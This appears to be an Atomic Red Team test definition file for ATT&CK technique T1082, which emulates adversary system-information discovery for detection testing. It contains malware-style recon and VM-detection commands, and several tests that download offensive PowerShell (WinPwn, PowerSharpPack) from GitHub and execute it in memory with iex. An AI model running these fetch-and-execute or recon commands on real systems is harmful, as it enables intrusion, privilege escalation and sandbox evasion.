attack_technique: T1082
display_name: System Information Discovery
atomic_tests:
- name: System Information Discovery
  auto_generated_guid: 66703791-c902-4560-8770-42b8a91f7667
  description: |
    Identify System Info. Upon execution, system info and time info will be displayed.
  supported_platforms:
  - windows
  executor:
    command: |
      systeminfo
      reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
    name: command_prompt
- name: System Information Discovery
  auto_generated_guid: edff98ec-0f73-4f63-9890-6b117092aff6
  description: |
    Identify System Info
  supported_platforms:
  - macos
  executor:
    command: |
      system_profiler
      ls -al /Applications
    name: sh
- name: List OS Information
  auto_generated_guid: cccb070c-df86-4216-a5bc-9fb60c74e27c
  description: |
    Identify System Info
  supported_platforms:
  - linux
  - macos
  input_arguments:
    output_file:
      description: Output file used to store the results.
      type: Path
      default: /tmp/T1082.txt
  executor:
    command: |
      uname -a >> #{output_file}
      if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi
      if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   
      if [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi
      uptime >> #{output_file}
      cat #{output_file} 2>/dev/null
    cleanup_command: |
      rm #{output_file} 2>/dev/null
    name: sh
- name: Linux VM Check via Hardware
  auto_generated_guid: 31dad7ad-2286-4c02-ae92-274418c85fec
  description: |
    Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.
  supported_platforms:
  - linux
  executor:
    command: |
      if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi
      if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi
      if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi
      if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"; fi
      if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi
      if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi
      if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i "vmware\|virtualbox"; fi
      if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i "Xen\|KVM\|Microsoft"; fi
    name: bash
- name: Linux VM Check via Kernel Modules
  auto_generated_guid: 8057d484-0fae-49a4-8302-4812c4f1e64e
  description: |
    Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.
  supported_platforms:
  - linux
  executor:
    command: |
      sudo lsmod | grep -i "vboxsf\|vboxguest"
      sudo lsmod | grep -i "vmw_baloon\|vmxnet"
      sudo lsmod | grep -i "xen-vbd\|xen-vnif"
      sudo lsmod | grep -i "virtio_pci\|virtio_net"
      sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
    name: bash
- name: Hostname Discovery (Windows)
  auto_generated_guid: 85cfbf23-4a1e-4342-8792-007e004b975f
  description: |
    Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.
  supported_platforms:
  - windows
  executor:
    command: |
      hostname
    name: command_prompt
- name: Hostname Discovery
  auto_generated_guid: 486e88ea-4f56-470f-9b57-3f4d73f39133
  description: |
    Identify system hostname for Linux and macOS systems.
  supported_platforms:
  - linux
  - macos
  executor:
    command: |
      hostname
    name: bash
- name: Windows MachineGUID Discovery
  auto_generated_guid: 224b4daf-db44-404e-b6b2-f4d1f0126ef8
  description: |
    Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.
  supported_platforms:
  - windows
  executor:
    command: |
      REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
    name: command_prompt
- name: Griffon Recon
  auto_generated_guid: 69bd4abe-8759-49a6-8d21-0f15822d6370
  description: |-
    This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre 
    in order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  
    For more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)
  supported_platforms:
  - windows
  input_arguments:
    vbscript:
      description: Path to sample script
      type: String
      default: PathToAtomicsFolder\T1082\src\griffon_recon.vbs
  dependency_executor_name: powershell
  dependencies:
    - description: |
       Sample script file must exist on disk at specified location (#{vbscript})
      prereq_command: |
        if (Test-Path #{vbscript}) {exit 0} else {exit 1}
      get_prereq_command: |
        New-Item -Type Directory (split-path #{vbscript}) -ErrorAction ignore | Out-Null
        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs" -OutFile "#{vbscript}"
  executor:
    command: 'cscript #{vbscript}'
    name: powershell
    elevation_required: false
- name: Environment variables discovery on windows
  auto_generated_guid: f400d1c0-1804-4ff8-b069-ef5ddd2adbf3
  description: |
    Identify all environment variables. Upon execution, environments variables and your path info will be displayed.
  supported_platforms:
  - windows
  executor:
    command: |
      set
    name: command_prompt
- name: Environment variables discovery on macos and linux
  auto_generated_guid: fcbdd43f-f4ad-42d5-98f3-0218097e2720
  description: |
    Identify all environment variables. Upon execution, environments variables and your path info will be displayed.
  supported_platforms:
  - macos
  - linux
  executor:
    command: |
      env
    name: sh
- name: Show System Integrity Protection status (MacOS)
  auto_generated_guid: 327cc050-9e99-4c8e-99b5-1d15f2fb6b96
  description: |
    Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.
  supported_platforms:
  - macos
  executor:
    command: |
      csrutil status
    name: sh
- name: WinPwn - winPEAS
  auto_generated_guid: eea1d918-825e-47dd-acc2-814d6c58c0e1
  description:  Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn
  supported_platforms:
  - windows
  executor:
    command: |-
      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
      winPEAS -noninteractive -consoleoutput
    name: powershell
- name: WinPwn - itm4nprivesc
  auto_generated_guid: 3d256a2f-5e57-4003-8eb6-64d91b1da7ce
  description:  Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn
  supported_platforms:
  - windows
  executor:
    command: |-
      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
      itm4nprivesc -noninteractive -consoleoutput
    name: powershell
- name: WinPwn - Powersploits privesc checks
  auto_generated_guid: 345cb8e4-d2de-4011-a580-619cf5a9e2d7
  description:  Powersploits privesc checks using oldchecks function of WinPwn
  supported_platforms:
  - windows
  executor:
    command: |-
      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
      oldchecks -noninteractive -consoleoutput
    cleanup_command: |-
      rm -force -recurse .\DomainRecon -ErrorAction Ignore
      rm -force -recurse .\Exploitation -ErrorAction Ignore
      rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
      rm -force -recurse .\LocalRecon -ErrorAction Ignore
      rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
    name: powershell
- name: WinPwn - General privesc checks
  auto_generated_guid: 5b6f39a2-6ec7-4783-a5fd-2c54a55409ed
  description:  General privesc checks using the otherchecks function of WinPwn
  supported_platforms:
  - windows
  executor:
    command: |-
      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
      otherchecks -noninteractive -consoleoutput
    name: powershell
- name: WinPwn - GeneralRecon
  auto_generated_guid: 7804659b-fdbf-4cf6-b06a-c03e758590e8
  description: Collect general computer informations via GeneralRecon function of WinPwn
  supported_platforms:
  - windows
  executor:
    command: |-
      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
      Generalrecon -consoleoutput -noninteractive
    name: powershell
- name: WinPwn - Morerecon
  auto_generated_guid: 3278b2f6-f733-4875-9ef4-bfed34244f0a
  description: Gathers local system information using the Morerecon function of WinPwn
  supported_platforms:
  - windows
  executor:
    command: |-
      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
      Morerecon -noninteractive -consoleoutput
    name: powershell
- name: WinPwn - RBCD-Check
  auto_generated_guid: dec6a0d8-bcaf-4c22-9d48-2aee59fb692b
  description: Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn
  supported_platforms:
  - windows
  executor:
    command: |-
      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
      RBCD-Check -consoleoutput -noninteractive
    name: powershell

- name: WinPwn - PowerSharpPack - Watson searching for missing windows patches 
  auto_generated_guid: 07b18a66-6304-47d2-bad0-ef421eb2e107
  description: PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn
  supported_platforms:
  - windows
  executor:
    command: |-
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
      Invoke-watson
    name: powershell
- name: WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors
  auto_generated_guid: efb79454-1101-4224-a4d0-30c9c8b29ffc
  description: PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.
  supported_platforms:
  - windows
  executor:
    command: |-
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
      Invoke-SharpUp -command "audit"
    name: powershell
    
- name: WinPwn - PowerSharpPack - Seatbelt 
  auto_generated_guid: 5c16ceb4-ba3a-43d7-b848-a13c1f216d95
  description: |-
    PowerSharpPack - Seatbelt technique via function of WinPwn.
    
    [Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.
  supported_platforms:
  - windows
  executor:
    command: |-
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
      Invoke-Seatbelt -Command "-group=all"; pause
    name: powershell
- name: Azure Security Scan with SkyArk
  auto_generated_guid: 26a18d3d-f8bc-486b-9a33-d6df5d78a594
  description: |
    Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. 
    Once the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. 
    See https://github.com/cyberark/SkyArk 
  supported_platforms:
  - azure-ad
  input_arguments:
    username:
      description: Azure AD username
      type: String
      default: null
    password:
      description: Azure AD password
      type: String
      default: T1082Az
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The SkyArk AzureStealth module must exist in $env:temp.
    prereq_command: |
      if (test-path $env:temp\AzureStealth.ps1){exit 0} else {exit 1}
    get_prereq_command: |
      invoke-webrequest "https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1" -outfile "$env:temp\AzureStealth.ps1"
  - description: |
      The AzureAD module must be installed.
    prereq_command: |
      try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
    get_prereq_command: |
      Install-Module -Name AzureAD -Force
  - description: |
      The Az module must be installed.
    prereq_command: |
      try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
    get_prereq_command: |
      Install-Module -Name Az -Force
  executor:
    command: |
      Import-Module $env:temp\AzureStealth.ps1 -force      
      $Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
      Connect-AzAccount -Credential $Credential
      Connect-AzureAD -Credential $Credential
      Scan-AzureAdmins -UseCurrentCred
    cleanup_command: |
      $resultstime = Get-Date -Format "yyyyMMdd"
      $resultsfolder = ("Results-" + $resultstime)
      remove-item $env:temp\$resultsfolder -recurse -force -erroraction silentlycontinue
    name: powershell
    elevation_required: true
- name: Linux List Kernel Modules
  auto_generated_guid: 034fe21c-3186-49dd-8d5d-128b35f181c7
  description: |
    Identify kernel modules installed. Upon successful execution stdout will display kernel modules installed on host.
  supported_platforms:
  - linux
  executor:
    command: |
      sudo lsmod
      sudo kmod list
    name: sh
